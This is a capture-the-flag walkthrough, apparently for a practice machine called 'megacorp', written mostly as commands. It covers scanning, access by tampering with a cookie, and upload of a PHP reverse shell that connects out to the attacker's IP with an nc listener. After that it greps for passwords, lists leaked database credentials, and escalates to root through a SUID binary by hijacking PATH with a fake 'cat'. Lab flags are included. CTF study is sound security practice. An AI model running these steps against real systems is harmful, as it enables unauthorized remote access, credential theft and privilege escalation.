[[ping]] the host
sudo nmap -sC  -sV --min-rate=1000 \[host]
*Visit website on Firefox. Shows login is available. Turn on Proxy on Firefox and view in Burpsuite Target Sitemap. Visit the login endpoint, and log in as Guest
http://[target]/cdn-cgi/login/admin.php?content=accounts&id=1
34322 admin admin@megacorp.com
*Use these to modify cookie and visit the Upload page 
In Parrot OS, it is possible to find webshells under the folder /usr/share/webshells/
*
nano /usr/share/webshells/php/php-reverse-shell.php

\<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. The author accepts no liability
// for damage caused by this tool. If these terms are not acceptable to you,
then
// do not use this tool.
//
\<SNIP>
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1'; // CHANGE THIS WITH YOUR IP
$port = 1234; // CHANGE THIS WITH YOUR LISTENING PORT
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
\<SNIP>
?>

*upload file, then brute force directories to locate where the uploaded files are stored*
gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

nc -lvnp 1234
*Upload the file and then view the file in uploads/php-reverse-shell.php
In the reverse shell, try whoami. Look around and find that /var/www/html/cdn-cgi/login has interesting php files*
cd /var/www/html/cdn-cgi/login directory
cat * | grep -i passw*
*reveals this: if($_POST["username"\=\=="admin" && $_POST["password"]\=\=="MEGACORP_4dm1n!!")
\<input type="password" name="password" placeholder="Password" />

*In order to have a functional shell though we can issue the following:*

python3 -c 'import pty;pty.spawn("/bin/bash")'

cat /etc/passwd

su robert
*but doesn't work, so read files one by one*
cat db.php
\<?php
$conn = msqli_connect(''localhost','robert','M3g4C0rpUs3r!','garage');
?>

find /home -name "user.txt" 2>/dev/null
cat/home/robert/user.txt *f2c74ee8db7983851ab2a96a44eb7981*

*We observe that user robert is part of the group bugtracker . Let's try to see if there is any binary within that group, then check what kind of file that is*
find / -group bugtracker 2>/dev/null
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

*There is a suid set on that binary, which is a promising exploitation path. Run the bugtracker and supply it with a random number.  The tool trying to output a file using the cat command, and when it doesn't find that file, it displays an error. In the error, it appears as if cat is being referenced without a full path. That means it is relying on the $PATH environment variable in the user's session to find the executable, and we might be able to exploit this in a path hijack attack. We will navigate to /tmp directory and create a file named cat:*
echo '/bin/sh' > cat

chmod +x cat

*In order to exploit this we can add the /tmp directory to the PATH environmental variable.*
export PATH=/tmp:$PATH
echo $PATH

*execute bugtracker from /tmp directory provide any number, then start interacting as root. Find root.txt in root folder. Cat does not work because it has been setup to run /tmp/cat *

/bin/cat /root/root.txt
*or*
less /root/root.txt
*af13b0bee69f8a877c3faf667f7beacf*
